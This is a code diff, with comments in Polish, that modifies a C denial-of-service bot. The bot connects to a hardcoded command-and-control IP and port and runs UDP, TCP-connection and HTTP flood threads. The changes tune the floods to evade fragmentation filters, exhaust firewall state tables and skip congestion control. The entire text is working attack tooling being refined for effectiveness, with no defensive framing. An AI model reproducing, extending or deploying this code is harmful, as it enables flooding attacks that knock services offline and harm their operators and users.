@@ -42,8 +42,7 @@ struct udphdr {
 // ==========================================
 #define MASTER_IP "93.115.101.182"
 #define MASTER_PORT 11290
-#define NUM_THREADS 800  // Pompujemy 100% mocy z VPSa
-
+#define NUM_THREADS 4  // Zoptymalizowane pod ilosc rdzeni, bez zabijania CPU przez Context Switching
 volatile int stop_attack = 0;
 time_t attack_end_time = 0;
 
@@ -68,8 +67,8 @@ void *udp_flood(void *arg) {
     target.sin_port = htons(args->port);
     target.sin_addr.s_addr = inet_addr(args->ip);
 
-    char payload[65507]; // Max UDP payload
-    for(int i = 0; i < 65507; i++) payload[i] = rand() % 255;
+    char payload[1400]; // Max UDP payload mniejsze niz MTU (zeby uniknac fragmentacji)
+    for(int i = 0; i < 1400; i++) payload[i] = rand() % 255;
 
     while(time(NULL) < attack_end_time && !stop_attack) {
         int sock = socket(AF_INET, SOCK_DGRAM, 0);
@@ -81,8 +80,8 @@ void *udp_flood(void *arg) {
         
         for(int i = 0; i < 2000; i++) {
             if(stop_attack) break;
-            // Losowy rozmiar pakietu by omijac proste filtry
-            int size = (rand() % 64000) + 1024; 
+            // Bezpieczny rozmiar omijajacy filtry fragmentacji (MTU 1500)
+            int size = (rand() % 800) + 500; 
             send(sock, payload, size, MSG_NOSIGNAL);
         }
         close(sock);
@@ -107,13 +106,10 @@ void *tcp_flood(void *arg) {
         int flag = 1;
         setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&flag, sizeof(int)); // Wylacza algorytm Nagle'a (pakiety leca instant)
         
-        // Czekamy na polaczenie (blokujace) zeby handshake sie udal
+        // Czysty Connection Flood: szybkie nawiazanie polaczenia i natychmiastowe zerwanie, omijamy zator (Congestion Control)
         if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
-            // Pompujemy śmieci w otwarte gniazdo
-            for(int i = 0; i < 1000; i++) {
-                if(stop_attack) break;
-                if(send(sock, payload, 1024, MSG_NOSIGNAL) < 0) break; // Jak rura pęknie, zamykamy i laczymy od nowa
-            }
+            // Wyczerpujemy tablice stanow firewalla bez wysylania gigabajtow smieci
+            send(sock, payload, 16, MSG_NOSIGNAL);
         }
         close(sock);
     }
@@ -138,12 +134,9 @@ void *http_flood(void *arg) {
         int sock = socket(AF_INET, SOCK_STREAM, 0);
         set_linger(sock); // Zapobiega zapchaniu portów
         
-        // HTTP lepiej zablokować na connect żeby poprawnie wysłać request
+        // Brak Pipeliningu - jedno zapytanie na gniazdo, w pelni zgodne z nowymi serwerami
         if(connect(sock, (struct sockaddr *)&target, sizeof(target)) == 0) {
-            for(int i=0; i<10; i++) { // pipelining atak
-                if(stop_attack) break;
-                send(sock, request, req_len, MSG_NOSIGNAL);
-            }
+            send(sock, request, req_len, MSG_NOSIGNAL);
         }
         close(sock);
     }
